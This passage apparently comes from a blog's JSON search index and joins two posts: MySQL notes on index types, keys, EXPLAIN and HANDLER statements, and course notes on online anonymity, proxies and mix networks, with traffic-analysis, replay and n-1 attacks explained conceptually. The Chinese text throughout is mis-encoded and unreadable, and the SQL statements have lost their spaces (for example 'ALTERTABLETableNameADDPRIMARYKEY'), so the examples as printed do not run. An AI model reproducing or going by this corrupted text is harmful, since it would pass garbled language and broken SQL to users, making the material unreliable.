æ›´é€‚åˆæ–‡ä»¶ç´¢å¼•ç³»ç»Ÿ    å…·ä½“çš„åˆ†ç±»ä¸å®ç°æ–¹æ³•æˆ‘ä»¬æ”¾åœ¨ä¸‹é¢è®²ï¼Œè¿™é‡Œå…ˆæœ‰ä¸€ä¸ªåŸºæœ¬çš„è®¤è¯† Indexçš„åˆ†ç±»   é€»è¾‘åˆ†ç±»\n  æŒ‰åŠŸèƒ½åˆ’åˆ†\n  ä¸»é”®ç´¢å¼•ï¼šå°†ä¸€å¼ è¡¨çš„ä¸»é”®åˆ—è®¾ä¸ºç´¢å¼•ï¼Œç‰¹ç‚¹æ˜¯ä¸€å¼ è¡¨åªèƒ½æœ‰ä¸€ä¸ªä¸»é”®ç´¢å¼•ï¼Œä¸å…è®¸é‡å¤ï¼Œä¹Ÿä¸å…è®¸ä¸ºNULL ALTERTABLETableNameADDPRIMARYKEY(column_list);åè¿‡æ¥è¯´ï¼Œä¸€ä¸ªæœ‰ä¸»é”®çš„æ•°æ®è¡¨çš„å­˜å‚¨å½¢å¼å°±æ˜¯ä¸€ä¸ªä¸»é”®ç´¢å¼•çš„æ–‡ä»¶   å”¯ä¸€ç´¢å¼•ï¼šè¢«ç´¢å¼•çš„åˆ—çš„å€¼ä¸å…è®¸é‡å¤ï¼Œä½†å…è®¸ä¸ºNULLï¼Œä¸€å¼ è¡¨å¯ä»¥åˆ›å»ºå¤šä¸ªå”¯ä¸€ç´¢å¼•ï¼›åŒæ—¶ï¼Œå¦‚æœæ˜¯ç»„åˆç´¢å¼•ï¼Œåˆ—å€¼çš„ç»„åˆä¹Ÿå¿…é¡»å”¯ä¸€ CREATEUNIQUEINDEXIndexNameON`TableName`(`å­—æ®µå`(length));#æˆ–è€…ALTERTABLETableNameADDUNIQUE(column_list);  æ™®é€šç´¢å¼•ï¼šä¸€å¼ è¡¨å¯ä»¥åˆ›å»ºå¤šä¸ªæ™®é€šç´¢å¼•ï¼Œä¸€ä¸ªæ™®é€šç´¢å¼•å¯ä»¥åŒ…å«å¤šä¸ªå­—æ®µï¼Œå…è®¸æ•°æ®é‡å¤ï¼Œå…è®¸NULLå€¼æ’å…¥ CREATEINDEXIndexNameON`TableName`(`å­—æ®µå`(length));#æˆ–è€…ALTERTABLETableNameADDINDEXIndexName(`å­—æ®µå`(length));  å…¨æ–‡ç´¢å¼•ï¼šæŸ¥æ‰¾æ–‡æœ¬ä¸­çš„å…³é”®è¯ï¼Œä¸»è¦ç”¨äºå…¨æ–‡å†…å®¹çš„æ£€ç´¢       æŒ‰è¢«ç´¢å¼•çš„åˆ—æ•°åˆ’åˆ†\n å•ä¾‹ç´¢å¼•ï¼šä¸€ä¸ªç´¢å¼•åªåŒ…å«ä¸€ä¸ªåˆ—ï¼Œä¸€ä¸ªè¡¨å¯ä»¥åˆ›å»ºå¤šä¸ªå•ä¾‹ç´¢å¼•  ç»„åˆ/è”åˆç´¢å¼•ï¼šä¸€ä¸ªç»„åˆç´¢å¼•åŒ…å«ä¸¤ä¸ªæˆ–ä¸¤ä¸ªä»¥ä¸Šçš„åˆ—ç»„åˆæˆä¸ºç´¢å¼•æ£€ç´¢çš„å¯¹è±¡ã€‚   å…¶æ»¡è¶³â€œæœ€å·¦å‰ç¼€â€åŸåˆ™ï¼Œå³ä½¿ç”¨whereæ—¶æ¡ä»¶è¦æŒ‰ç…§å»ºç«‹æ‰€ä»¥çš„å­—æ®µçš„æ’åˆ—æ–¹å¼è®¾ç½®æ‰èƒ½ä½¿ç´¢å¼•ç”Ÿæ•ˆ  Figure 3: è”åˆç´¢å¼•ï¼šå°†å‡ ä¸ªåˆ—çš„å€¼ç»„åˆèµ·æ¥è¿›è¡Œç´¢å¼•\n            ç‰©ç†åˆ†ç±»\nç‰©ç†åˆ†ç±»ä¸»è¦é€šè¿‡å®ç°Indexå®ä¾‹çš„æ–¹æ³•æ°›å›´èšç°‡ç´¢å¼•å’Œéèšç°‡ç´¢å¼•ï¼ˆä¹Ÿå«è¾…åŠ©ç´¢å¼•æˆ–è€…è€³æœºç´¢å¼•ï¼‰ï¼Œé‚£ä¹ˆä¸»è¦çš„åŒºåˆ«å°±æ˜¯   Clustered Index èšç°‡ç´¢å¼•\nå…¶ä¸»è¦ç‰¹ç‚¹å°±æ˜¯ï¼Œæ•°æ®çš„å­˜å‚¨ä¸ç´¢å¼•æ˜¯æ”¾åœ¨ä¸€èµ·çš„ï¼Œç´¢å¼•å®Œæˆä¹‹åï¼Œæ•°æ®ä¹Ÿéšä¹‹è¢«æ‰¾åˆ°ã€‚  Figure 4: B+Tree\n      éèšç°‡ç´¢å¼•\næ•°æ®å’Œç´¢å¼•æ˜¯åˆ†å¼€çš„ï¼Œå…¶B+Treeå¶å­ç»“ç‚¹å­˜æ”¾çš„æ˜¯çœŸæ­£æ•°æ®çš„åœ°å€è€Œéæ•°æ®çš„å†…å®¹  Figure 5: è¾…åŠ©ç´¢å¼•ï¼šæ•°æ®ä¸ç´¢å¼•åˆ†å¼€\n      Index: pros \u0026amp; cons å‡å°‘äº†æœåŠ¡å™¨æ‰«æçš„æ•°æ®é‡ï¼Œå¤§å¤§åŠ å¿«äº†æ•°æ®çš„æ£€ç´¢é€Ÿåº¦ ä¸»è¦ä¼˜ç‚¹ï¼š  ç´¢å¼•å¤§å¤§å‡å°äº†æœåŠ¡å™¨éœ€è¦æ‰«æçš„æ•°æ®é‡ï¼Œä»è€Œå¤§å¤§åŠ å¿«æ•°æ®çš„æ£€ç´¢é€Ÿåº¦ï¼Œè¿™ä¹Ÿæ˜¯åˆ›å»ºç´¢å¼•çš„æœ€ä¸»è¦çš„åŸå› ã€‚  å¯ä»¥åŠ é€Ÿè¡¨å’Œè¡¨ä¹‹é—´çš„è¿æ¥ï¼Œç‰¹åˆ«æ˜¯åœ¨å®ç°æ•°æ®çš„å‚è€ƒå®Œæ•´æ€§æ–¹é¢ç‰¹åˆ«æœ‰æ„ä¹‰ã€‚  åœ¨ä½¿ç”¨åˆ†ç»„å’Œæ’åºå­å¥è¿›è¡Œæ•°æ®æ£€ç´¢æ—¶ï¼ŒåŒæ ·å¯ä»¥æ˜¾è‘—å‡å°‘æŸ¥è¯¢ä¸­åˆ†ç»„å’Œæ’åºçš„æ—¶é—´ã€‚  é€šè¿‡ä½¿ç”¨ç´¢å¼•ï¼Œå¯ä»¥åœ¨æŸ¥è¯¢çš„è¿‡ç¨‹ä¸­ï¼Œä½¿ç”¨ä¼˜åŒ–éšè—å™¨ï¼Œæé«˜ç³»ç»Ÿçš„æ€§èƒ½ã€‚   ä¸»è¦ç¼ºç‚¹ï¼š  åˆ›å»ºç´¢å¼•å’Œç»´æŠ¤ç´¢å¼•è¦è€—è´¹æ—¶é—´ï¼Œè¿™ç§æ—¶é—´éšç€æ•°æ®é‡çš„å¢åŠ è€Œå¢åŠ   ç´¢å¼•éœ€è¦å ç‰©ç†ç©ºé—´ï¼Œé™¤äº†æ•°æ®è¡¨å ç”¨æ•°æ®ç©ºé—´ä¹‹å¤–ï¼Œæ¯ä¸€ä¸ªç´¢å¼•è¿˜è¦å ç”¨ä¸€å®šçš„ç‰©ç†ç©ºé—´ï¼Œå¦‚æœéœ€è¦å»ºç«‹èšç°‡ç´¢å¼•ï¼Œé‚£ä¹ˆéœ€è¦å ç”¨çš„ç©ºé—´ä¼šæ›´å¤§  å¯¹è¡¨ä¸­çš„æ•°æ®è¿›è¡Œå¢ã€åˆ ã€æ”¹çš„æ—¶å€™ï¼Œç´¢å¼•ä¹Ÿè¦åŠ¨æ€çš„ç»´æŠ¤ï¼Œè¿™å°±é™ä½äº†æ•´æ•°çš„ç»´æŠ¤é€Ÿåº¦  å¦‚æœæŸä¸ªæ•°æ®åˆ—åŒ…å«è®¸å¤šé‡å¤çš„å†…å®¹ï¼Œä¸ºå®ƒå»ºç«‹ç´¢å¼•å°±æ²¡æœ‰å¤ªå¤§çš„å®é™…æ•ˆæœã€‚  å¯¹äºéå¸¸å°çš„è¡¨ï¼Œå¤§éƒ¨åˆ†æƒ…å†µä¸‹ç®€å•çš„å…¨è¡¨æ‰«ææ›´é«˜æ•ˆï¼›   Mysqlä¸­key(primary key, unique key) v.s. indexçš„åŒºåˆ« æˆ‘ä»¬åœ¨ä¼˜åŒ–Mysqlçš„æ—¶å€™ï¼Œç»å¸¸ä¼šçœ‹åˆ°keyä¸indexçš„è¿ç”¨æˆ–è€…æ›¿æ¢ï¼Œè¿™åŒæ ·ä¹Ÿæ˜¯æˆ‘éå¸¸çš„å›°æ‰°ï¼Œæˆ‘ä»¬ä»Šå¤©å°±æ¥å¥½å¥½ç†ä¸€ç†ï¼Œåˆ°åº•å¦‚æœæ¥ä½¿ç”¨è¿™ä¸¤ä¸ªåè¯  key keyåŒ…å«ä¸¤å±‚å«ä¹‰  çº¦æŸï¼Œè¡¨ç¤ºå¯¹äºåˆ—çš„ä¸€äº›ç‰¹æ®Šçš„è¦æ±‚  ç´¢å¼•ï¼Œå½“æˆ‘ä»¬å°†ä¸€åˆ—è®¾ç½®ä¸ºkeyæ—¶ï¼Œå…¶è‡ªåŠ¨å°±ä¼šåˆ›å»ºä¸€ä¸ªIndexï¼ˆå¯ç”¨show index from table_name;è¿›è¡ŒæŸ¥è¯¢ï¼‰    primary key  çº¦æŸï¼šåˆ—çš„å€¼å”¯ä¸€,éç©ºï¼Œå”¯ä¸€æ ‡è¯†  ä¸ºè¿™ä¸ªä¸»é”®åˆ—ï¼ˆè¿™ä¸ªkeyï¼‰å»ºç«‹ä¸€ä¸ªä¸»é”®ç´¢å¼•ï¼ˆInnoDBä¸­å°±ä¼šåœ¨å¶å­èŠ‚ç‚¹å­˜å‚¨è®°å½•çš„çœŸå®æ•°æ®ï¼‰    unique key  çº¦æŸï¼šä¿è¯åˆ—å€¼çš„å”¯ä¸€æ€§  ä¸ºè¿™ä¸ªåˆ—å»ºç«‹ä¸€ä¸ªå”¯ä¸€ç´¢å¼•    foreign key   çº¦æŸï¼šå¤–é”®çš„çº¦æŸï¼Œè§„èŒƒæ•°æ®çš„å¼•ç”¨å®Œæ•´æ€§   ä¸ºè¿™ä¸ªå¤–é”®å»ºç«‹ä¸€ä¸ªæ™®é€šç´¢å¼•      EXPLAIN: åˆ†æSQLæŸ¥è¯¢è¯­å¥ {EXPLAIN|DESCRIBE|DESC}tbl_name[col_name|wild]{EXPLAIN|DESCRIBE|DESC}[explain_type]{explainable_stmt|FORCONNECTIONconnection_id} Figure 7: explain example\n  å…·ä½“å¯ä»¥å‚è€ƒå®˜ç½‘å¯¹äºæ¯ä¸€åˆ—å†…å®¹çš„ä»‹ç»ï¼Œexplainçš„ç›®çš„å¯ä»¥å¸®åŠ©åˆ†æä¸€æ¡selectè¯­å¥å…·ä½“æ˜¯å¦‚ä½•è¿›è¡ŒæŸ¥è¯¢çš„ï¼ŒåŒ…æ‹¬å¯¹äºå¼•ç”¨ï¼Œç´¢å¼•çš„ä½¿ç”¨ Handler å¥æŸ„ å‚è€ƒï¼š ã€MySQLã€‘MySQL ä¹‹ handler çš„è¯¦ç»†ä½¿ç”¨åŠè¯´æ˜ 13.2.4 HANDLER Statement HANDLER è¯­å¥æä¾›äº†ç›´æ¥è®¿é—®table storage engineçš„æ¥å£ï¼Œé€‚ç”¨äºInnoDB and MyISAM è¡¨ HANDLER ... OPEN è¯­å¥å¯ä»¥æ‰“å¼€ä¸€ä¸ªtableï¼Œå¹¶é€šè¿‡æ¥ä¸‹æ¥çš„ HANDLER ... READ è¯­å¥æ¥è¿›è¡Œè®¿é—®ï¼Œä¸€æ—¦æ‰“å¼€åå°±å¼€å¯äº†ä¸€ä¸ªç‹¬ç«‹çš„ä¼šè¯ï¼Œå¹¶ä¸”ä¸ä¼šè¢«å…¶ä»–çš„ä¼šè¯å…±äº«ç›´åˆ° HANDLER ... CLOSE ä¹‹å‰éƒ½ä¸ä¼šæ¶ˆå¤± Basic Syntax, åŸºç¡€è¯­æ³•ï¼š #æ‰“å¼€ä¸€å¼ è¡¨ï¼Œå¹¶ä¸”å¯ä»¥é€‰æ‹©aliasHANDLERtbl_nameOPEN[[AS]alias]#1.æŸ¥çœ‹è¡¨æ‰€åˆ›å»ºçš„ç´¢å¼•æ¥æ£€ç´¢åè¿‡æ¥æŸ¥çœ‹tableçš„å†…å®¹ï¼ŒHANDLERtbl_nameREADindex_name{=|\u0026lt;=|\u0026gt;=|\u0026lt;|\u0026gt;}(value1,value2,...)[WHEREwhere_condition][LIMIT...]#2.åŒæ—¶ä¹Ÿå¯ä»¥ç”¨FIRST,NEXT,PREV,LASTæ¥è¾…åŠ©ç´¢å¼•è¿›è¡Œéå†HANDLERtbl_nameREADindex_name{FIRST|NEXT|PREV|LAST}[WHEREwhere_condition][LIMIT...]#3.ä¸é€šè¿‡ç´¢å¼•æ¥æŸ¥çœ‹è¡¨ï¼ˆé€Ÿåº¦å˜æ…¢ï¼Œæ£€ç´¢çš„å½¢å¼ä¹Ÿå˜å°‘äº†ï¼‰#READFIRST:è·å–å¥æŸ„çš„ç¬¬ä¸€è¡Œ#READNEXT:ä¾æ¬¡è·å–å…¶ä»–è¡Œï¼ˆå½“ç„¶ä¹Ÿå¯ä»¥åœ¨è·å–å¥æŸ„åç›´æ¥ä½¿ç”¨è·å–ç¬¬ä¸€è¡Œï¼‰#æœ€åä¸€è¡Œæ‰§è¡Œä¹‹åå†æ‰§è¡ŒREADNEXTä¼šè¿”å›ä¸€ä¸ªç©ºçš„ç»“æœHANDLERtbl_nameREAD{FIRST|NEXT}[WHEREwhere_condition][LIMIT...]HANDLERtbl_nameCLOSE","date":"2022-06-05T00:00:00Z","permalink":"https://ginkgo.org.cn/posts/mysql_tricks/","title":"Mysqlä¸­çš„â€œå¥‡æŠ€æ·«å·§â€"},{"content":"NSE Week 10: Privacy and anonymity Privacy and Anonymity Privacy is about you choosing what you let other people know which means keep confidentiality of information that you don\u0026rsquo;t want to share with others However, Anonymity is about conceal your identity, the confidentiality of your identity, no one know what you are doing. Privacy and anonymity on public networks However, the confidentiality of both the data you want to transmit or your identity is exposed to Internet.   Internet is designed as a public network  Devices in LAN can see your traffic  Intermediate routers can see all traffic that passes through them  Remember what we leanred in CIS? Email is actually a post card but not a letter, which means everyone could see the content on it with envelop protects     Routing information is public   IP packet will contain source and destination for routing   It is easy to figure out who is talking to whom     Encryption dose NOT hide identities   encryption only happen on payload but not the routing information in header   Even IPsec have to reveal the IP address of IPsec gateways     Why is anonymity so important?  packet headers exposes two ends of communication  packet routes can be tracked (traffic analysis)  encrypted payload is still visible (cryptanalysis)   Some applications:  Privacy  hide online transactions, web browsing    Untraceable email  corporate whistle-blowers  political dissidents  confidential business negotiations    Digital cash  unlinkable to buyer\u0026rsquo;s identity    Anonymous electronic voting (e-voting)  Censorship-resistant publishing   Anonymity Anonymityä¸­æœ€é‡è¦çš„ä¸€ç‚¹ï¼šä½ åªèƒ½åœ¨ä¸€ç¾¤äººä¸­æ‰èƒ½ä½¿è‡ªå·±åŒ¿åï¼Œå³æ‰€æœ‰äººéƒ½åœ¨ä¸€èµ·å‘é€ï¼Œæ¥æ”¶ï¼Œåšå‡ºåŒæ ·çš„è¡ŒåŠ¨ï¼Œæ‰èƒ½éšè—ä¸ªäººçš„è¡Œä¸º You are only anonymous within a group is your actions You cannot be anonymous by yourself!!! Anonymityç”±ä¸‰ä¸ªç‰¹æ€§  Anonymity  ä»èŒ«èŒ«å¤šçš„æ´»åŠ¨ä¸­éšè—è‡ªå·±çš„æ´»åŠ¨ï¼Œè€Œä¸è¦æ˜¾çœ¼çš„è¢«æŒ‘å‡ºæ¥    Unlinkability  æ— æ³•å°†è¡ŒåŠ¨ä¸ä¸ªäººè”ç³»èµ·æ¥  æ¯”å¦‚å‘å®Œé‚®ä»¶ä¹‹åï¼Œå‘ä»¶äººå’Œé‚®ä»¶å°±æ²¡æœ‰å…³è”äº†    Unobservability  å¾ˆéš¾å®ç°  æ—¢åˆ«äººæ— æ³•æ„è¯†åˆ°è¿™ä»¶äº‹æƒ…åˆ°åº•å‘ç”Ÿæ²¡æœ‰  ç¬”åå°±æ˜¯ä¸€ä¸ªç®€å•çš„æ–¹æ³•ï¼Œç”¨æ¥éšè—è‡ªå·±çš„èº«ä»½ï¼ˆç”¨æˆ·åï¼‰       Attacks on anonymity?\nPassive traffic analysis : - ä»ç½‘ç»œæ´»åŠ¨ä¸­å‘ç°è°ä¸è°åœ¨é€šä¿¡ - ä¸ºäº†éšè—è‡ªå·±çš„æ´»åŠ¨ï¼Œæ¯ä¸ªäººå¿…é¡»è¦è¿˜è¦å¤„ç†åˆ«äººçš„trafficï¼Œå³æ¯ä¸ªäººéƒ½åœ¨åšä¸€æ ·çš„äº‹æƒ…ï¼Œåˆ†ä¸æ¸…çœŸæ­£æƒ³è¦åšè¿™ä»¶äº‹æƒ…çš„äººæ˜¯è° Active traffic analysis : - æ³¨å…¥æ•°æ®åŒ…æˆ–è€…å°†signatureæ³¨å…¥æ•°æ®æµä¸­è¿›è¡Œè¿›ä¸€æ­¥è§‚å¯Ÿ Compromise of network nodes : - é»‘å…¥ç½‘ç»œä¸­çš„èŠ‚ç‚¹ï¼Œç„¶åè¢«åŠ¨çš„æ”¶é›†æ•°æ® - å› æ­¤ä¸èƒ½ç›¸ä¿¡ä»»æ„ä¸€ä¸ªç½‘ç»œèŠ‚ç‚¹ï¼Œè¢«é»‘ä»¥åéƒ½æ˜¯ä¸æ˜æ˜¾çš„ Proxyä¹Ÿå¯ä»¥ç”¨æ¥è¿›è¡ŒåŒ¿å  senderé€šè¿‡proxyæ”¹å˜äº†è‡ªå·±çš„ä¿¡æ¯ï¼Œä½¿åŸå§‹çš„senderä¸ä¼šè¢«æ‰¾åˆ°  receiveråˆ™é€šè¿‡å¹¿æ’­æˆ–è€…å¤šæ’­å‘é€ç»™æ•´ä¸€ä¸ªåŒ¿åç»„ç”¨æˆ·ï¼Œå…¶ä¸­åªæœ‰ä¸€ä¸ªçœŸæ­£çš„æ¥æ”¶è€…   å¼±ç‚¹åœ¨å“ªå„¿å‘¢ï¼Ÿ é‚£å°±æ˜¯ProxyçŸ¥é“ä¸€åˆ‡çš„äº‹æƒ…ï¼Œå¦‚æœproxyè¢«é»‘å®¢æ§åˆ¶ï¼Œé‚£ä¹ˆä¸€åˆ‡éƒ½æ²¡æœ‰æ„ä¹‰äº† æˆ‘ä»¬ä¹Ÿå¯ä»¥ç”¨cascaded proxy chainsï¼Œmix networksæ¥counterè¿™ä¸ªæ”»å‡»     Cascaded proxies with encryption\nä½•è°“cascaded proxiesçº§è”ä»£ç†å‘¢ï¼Ÿå°±æ˜¯æˆ‘ä»¬é€šè¿‡å¤šå±‚çš„ä»£ç†ï¼Œæ¯ä¸€å±‚éƒ½proxyéƒ½æ‹¥æœ‰ä¸€ä¸ªprivate keyæ¥è¿›è¡Œè§£å¯†ï¼Œå†ä¼ é€’ç»™ä¸‹ä¸€ä¸ªproxyç»§ç»­è§£å¯†ï¼Œåªæœ‰æœ€åä¸€ä¸ªproxyæœåŠ¡å™¨çŸ¥é“æœ€åˆå§‹çš„æ•°æ®ï¼Œç„¶åå¹¿æ’­åˆ°åŒ¿åç»„é‡Œå» ä½†æ˜¯æµé‡åˆ†æè¿˜æ˜¯å¯ä»¥å®ç°ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦mix networks   Mix networks ä¸»è¦ç›®çš„æ˜¯ä¸ºäº†å»ºç«‹ä¸€ä¸ªåŒ¿åçš„channel åœ¨åƒåœ¾é‚®ä»¶å‡ºç°ä¹‹å‰ï¼Œå¤§å®¶éƒ½è§‰å¾—åŒ¿åé‚®ä»¶æ˜¯ä¸ªå¥½ä¸œè¥¿ï¼Œä»è€Œè¡ç”Ÿå‡ºäº†å¾ˆå¤šçš„remailers Mix = Public-key cryptography + trusted re-mailer  Publick keyå°±ä½œä¸ºæŒä¹…çš„å‡åï¼Œå°±ç±»ä¼¼äºBitcoinä¸­çš„address  Untrusted communication medium: è¢«è®¾è®¡åœ¨ä¸€ä¸ªæ”»å‡»è€…å¯ä»¥  è·å–æ‰€æœ‰çš„source/destinationä¿¡æ¯ï¼Œä»¥åŠæ‰€ä¼ é€’çš„ä¿¡æ¯  å¯ä»¥ä¿®æ”¹æ³¨å…¥åˆ é™¤æ‰€æœ‰çš„ messages  ä½†æ˜¯å”¯ä¸€åšä¸åˆ°çš„äº‹æƒ…å°±æ˜¯ä¸èƒ½æ‰¾åˆ°è¿™äº›ä¿¡æ¯ä¹‹é—´çš„å…³ç³»ï¼Œcannot coorelate plaintext and ciphertext,ä¹Ÿæ— æ³•è¿›è¡Œä¼ªé€ ï¼ˆä¸çŸ¥é“å¦‚ä½•åŠ å¯†ï¼‰     Using a single Mix æˆ‘ä»¬ç”¨ Mix ä»£è¡¨ä¸€ä¸ªé‚®ä»¶å¤„ç†ç³»ç»Ÿ  Aå‘å‡ºä¸€æ¡ä¿¡æ¯ç»™Mix,ä½¿ç”¨mixerçš„public keyè¿›è¡ŒåŠ å¯†ï¼ŒMixä¼šè§£å¯†ä¹‹åé‡æ–°ç»„è£…ï¼Œç„¶åå‘é€ç»™ä¸€ä¸ªåŒ¿åç»„æ‰€æœ‰çš„ç”¨æˆ·ï¼Œæ¯ä¸€ä¸ªç”¨æˆ·æ‰€æ¥å—åˆ°çš„ä¿¡æ¯éƒ½æ˜¯ä¸åŒçš„ æ”»å‡»è€…å¯ä»¥çœ‹åˆ°æ‰€æœ‰çš„senders and receiversä½†æ˜¯å´ä¸èƒ½å°†å‘é€çš„æ¶ˆæ¯å’Œç»ç”±Mixé‡æ–°ç»„è£…åçš„æ¶ˆæ¯æ‰€è”ç³»èµ·æ¥  å…¶ä¸­r1, r0 è¿™äº›å†…å®¹æ˜¯ä¸ºäº†æ»¡è¶³åŠ å¯†ç®—æ³•æ‰€éœ€è¦çš„byteæ•°è€Œè¿›è¡Œçš„padding   Foiling traffic analysis: four requirements\nä¸ºäº†é˜²æ­¢è¿›è¡Œæµé‡åˆ†æï¼Œmixè¿˜æä¾›äº†å››ä¸ªè¦æ±‚  Agents/mixes work with uniformly sized items è¦æ±‚æ‰€æœ‰çš„ä¿¡æ¯éƒ½æ˜¯åŒæ ·æ ¼å¼çš„ï¼ˆæ¯”å¦‚æ‰€æœ‰çš„ä¿¡æ¯éƒ½è¢«paddedåˆ°ç›¸åŒçš„é•¿åº¦çš„blockååŠ å¯†ï¼‰  Order of arrival hidden by outputting items in batches é€šè¿‡æ‰¹é‡è¾“å‡ºä¿¡æ¯åˆ°åŒ¿åç»„æ¥éšè—é¡ºåº  Repeated information must be blocked ä¸å…è®¸é‡å¤çš„ä¿¡æ¯ï¼Œéœ€è¦é€šè¿‡è¿‡æ»¤å™¨æ¥ç­›æŸ¥é‡å¤ä¿¡æ¯  Sufficient traffic from a large anonymity set if required éœ€è¦å¤§é‡çš„åŒ¿åç»„ç”¨æˆ·è¿›è¡Œæ•°æ®çš„å‘é€  å¤ªå°‘çš„è¯å°±ä¼šå‰Šå¼±anonymity  å¯ä»¥è®©clientså®šæœŸå‘é€æˆ–è€…æ¥å—dummy messageså‡ä¿¡æ¯          Generating receipts\nMixåŒæ ·å¯ä»¥ç”¨æ¥ç”Ÿæˆreceiptä»£è¡¨messageè¢«æ”¶åˆ°äº†  è¿™é‡Œçš„ c æ˜¯å¾ˆå¤§çš„ï¼Œæˆ‘è§‰å¾—åº”è¯¥å°±æ˜¯ä¸ºäº†ä¿æŒç›¸ç­‰çš„æ ¼å¼ï¼Œå¯ä»¥ç”¨å¾ˆå¤š0æ¥å¡«å……    Mix networks æˆ‘ä»¬å·²ç»çœ‹è¿‡äº†ä¸€ä¸ªå•ç‹¬çš„Mixæ˜¯å¦‚ä½•å·¥ä½œçš„ï¼Œå…¶å®å’Œä¹‹å‰çš„proxyå¾ˆç±»ä¼¼ï¼Œéƒ½å­˜åœ¨ä¸€ä¸ªç¼ºç‚¹ï¼Œå°±æ˜¯ä¸€æ—¦è¢«æ”»å‡»ï¼Œé‚£ä¹ˆæ‰€æœ‰ä¿¡æ¯éƒ½ä¼šæš´éœ² å› æ­¤æˆ‘ä»¬åœ¨è¿™é‡Œé‡‡å–åŒæ ·çš„ç­–ç•¥ï¼Œå³ä½¿ç”¨çº§è”çš„MixæœåŠ¡å™¨ç›¸è¿æ¥å¤„ç† æ¯ä¸€ä¸ªMixéƒ½å±äºä¸åŒçš„administrative domainï¼Œè¿™é‡Œåº”è¯¥æƒ³è¯´çš„æ˜¯ä¸å±äºåŒä¸€ä¸ªåœ°æ–¹ç®¡è¾–ï¼Œä¹Ÿå°±ä¸ä¼šå› ä¸ºä¸€ä¸ªè¢«é»‘å…¥äº†ï¼Œå°±ä¼šå½±å“å…¶ä»–çš„servers é€šè¿‡å¤šä¸ªMix serverè”åˆä½¿ç”¨ï¼Œåªè¦è¿˜æœ‰ä¸€ä¸ªserveræ²¡æœ‰è¢«é»‘å…¥ï¼Œé‚£ä¹ˆé€šä¿¡å°±è¿˜æ˜¯åŒ¿åçš„ æˆ‘ä»¬å‡è®¾networkä¸­å­˜åœ¨ç€å¤šä¸ªMix serverï¼Œé‚£ä¹ˆAliceå°±éœ€è¦é€‰æ‹©Mix-pathæ¥å†³å®šè·¯ç»é‚£å‡ ä¸ªserverï¼Œç„¶åä½¿ç”¨å¯¹åº”çš„å¯†é’¥è¿›è¡ŒåŠ å¯†å†å‘é€ç»™Bob    Alice æ ¹æ®Mix-pathé€‰æ‹©Mix serverçš„public keyå¯¹æ•°æ®è¿›è¡Œpaddingä¸åŠ å¯†  æ¯ä¸€ä¸ªé€”å¾„çš„Mix-serverç”¨è‡ªå·±çš„private keyè§£å¯†åå†ä¼ è¾¾ç»™ä¸‹ä¸€ä¸ª  æœ€ç»ˆæœ€åä¸€ä¸ªMix serverå°±å’Œæˆ‘ä»¬ä¹‹å‰æåˆ°è¿‡çš„é‚£æ ·å‘é€ç»™åŒ¿åç»„   é‚£ä¹ˆæ—¢ç„¶æœ€åä¸€ä¸ªMix serveråˆå˜æˆäº†single Mix-serverä¸­æœ€ç®€å•çš„æ¨¡å¼ï¼Œéš¾é“è¢«æ”»ç ´ä¹‹åä¸æ˜¯æ¯«æ— æ„ä¹‰äº†å—ï¼Ÿ è¿™é‡Œè¦æ³¨æ„çš„æ˜¯ï¼Œæ¯ä¸€ä¸ªMix serverä¹Ÿå°±æ˜¯ä»…ä»…åªèƒ½çŸ¥é“å‰ä¸€ä¸ªMix serverçš„ä¿¡æ¯ï¼Œå‘é€æ–¹çš„ä¿¡æ¯æ ¹æœ¬å·²ç»æ— ä»çŸ¥æ™“äº† Untraceable return addresses å¦‚ä½•åŒ¿åå‘é€å›å¤æ¶ˆæ¯è¡¨ç¤ºä¿¡æ¯æ”¶åˆ°äº†å‘¢ï¼Ÿ   Single Mix case (with key pk_mix1):  å‘é€æ–¹åœ¨è‡ªå·±çš„æ•°æ®é‡ŒåŒ…å« return address: {r1, A_x}_pk_mix1, pk_x  r1, random string, can be used as a shared key  pk_x, a fresh public key  Ax çœŸå®çš„åœ°å€    æ¥å—è€…å›å¤ï¼š {r1, A_x}_pk_mix1, {r0, M\u0026rsquo;}pk_x  é€šè¿‡ fresh public keyå¯¹æ•°æ®è¿›è¡ŒåŠ å¯†    Mixè§£å¯†ä¹‹åå¾—çŸ¥çœŸå®çš„åœ°å€æ˜¯Axï¼Œç„¶åå›å¤ç»™A     çº§è”çš„Mix serversçš„å¤„ç†æ–¹å¼    åŒæ ·çš„åŠæ³•ï¼ŒAä¼šé™„å¸¦è‡ªå·±çš„åœ°å€ä»¥åŠä¸€ä¸ªpk_x,ç„¶åBåœ¨å›å¤çš„æ—¶å€™ä¼šä¸€å±‚å±‚æ ¹æ®é€‰æ‹©çš„Mix-pathä¸Šçš„Mix serverçš„public keyè¿›è¡Œå±‚å±‚åŠ å¯†åè¿”å› Mix networks: attacks  Tracing a message   å› ä¸ºå­˜åœ¨å¤§é‡çš„dummy messageså‡æ¶ˆæ¯è€Œä¸å¯è¢«è¿½è¸ª   Replay attack, ç”¨é‡å¤çš„messsageè¿›è¡Œæ”»å‡»    ä½†æ˜¯æ¯ä¸€ä¸ª Mix server ä¸­éƒ½æœ‰ä¸€ä¸ªé‡å¤ä¿¡æ¯çš„è¿‡æ»¤å™¨ï¼Œä¹Ÿä¸å¯èƒ½å‘ç”Ÿ Mix networks: n-1 attack n-1 attack æ˜¯ä¸€ç§active attack, attacker é€šè¿‡floodingä¸€ä¸ªnodeï¼Œä½¿ä¸€ä¸ªnodeä¸Šå¤§éƒ¨åˆ†çš„æ•°æ®éƒ½æ˜¯å…¶åšçŸ¥æ™“çš„ï¼Œé‚£ä¹ˆå‰©ä¸‹æ¥çš„å†…å®¹å°±å¾ˆå®¹æ˜“è¿›è¡Œåˆ†æäº† å¦‚ä½•è¿›è¡Œé˜²å¾¡å‘¢ï¼Ÿ ä½¿ç”¨Hearbeat message:  æ¯ä¸€ä¸ªMix serveréƒ½ä¼šæ£€æµ‹è‡ªå·±çš„ç½‘ç»œç¯å¢ƒï¼Œç„¶åè§‚å¯Ÿå‘å‡ºçš„æ¶ˆæ¯æ”¶åˆ°çš„å›å¤æƒ…å†µï¼Œæˆ‘ä»¬ç§°ä¸ºheartbeat messageså¿ƒè·³  å½“Mix serveræ”¶åˆ°äº†flooding attackå…¶æ— æ³•åˆ¤æ–­å“ªäº›æµé‡æ˜¯å¥½çš„è¿˜æ˜¯æ”»å‡»è€…çš„æµé‡ï¼Œä½†æ˜¯é€šè¿‡å¯¹äº heatbeat messageåœ¨è¿™äº›æµé‡çš„æ¯”ä¾‹çš„åˆ¤æ–­ï¼Œæ¥ä¸»åŠ¨å¢åŠ 